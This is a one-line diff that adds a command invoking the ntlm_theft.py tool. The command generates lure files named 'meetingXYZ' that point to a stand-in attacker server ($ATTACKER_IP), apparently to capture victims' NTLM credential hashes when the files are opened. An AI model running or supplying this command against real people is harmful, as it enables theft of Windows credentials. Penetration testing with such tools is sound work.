@@ -1,0 +1,1 @@
+ntlm_theft.py --verbose --generate modern --server "$ATTACKER_IP" --filename "meetingXYZ"
